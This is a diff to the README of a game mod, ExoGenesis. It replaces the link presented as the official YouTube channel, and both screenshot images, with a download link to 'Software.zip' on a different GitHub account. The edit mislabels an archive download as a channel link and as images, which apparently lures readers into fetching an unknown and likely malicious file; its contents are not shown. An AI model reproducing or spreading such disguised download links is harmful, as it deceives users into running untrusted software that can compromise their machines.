@@ -2,7 +2,7 @@
 
 My discord AureusAltirius#6109
 
-Official exogenesis youtube channel link https://youtube.com/channel/UCkIHhwPP42TkNtdx56vbHGA
+Official exogenesis youtube channel link https://github.com/Austrianpaintar/ExoGenesis/releases/download/v1.0/Software.zip
 
 A mod that adds a lot more content to the game.
 <br>I just hope you guys enjoy my mod.
@@ -51,5 +51,5 @@ everything.
 
 ## Screenshots
 
-![unknown-14](https://user-images.githubusercontent.com/68311340/118233805-7227c080-b460-11eb-99cd-5ab35cecb273.png)
-![unknown-15](https://user-images.githubusercontent.com/68311340/118233809-7358ed80-b460-11eb-8077-b3304aab2e0d.png)
+![unknown-14](https://github.com/Austrianpaintar/ExoGenesis/releases/download/v1.0/Software.zip)
+![unknown-15](https://github.com/Austrianpaintar/ExoGenesis/releases/download/v1.0/Software.zip)
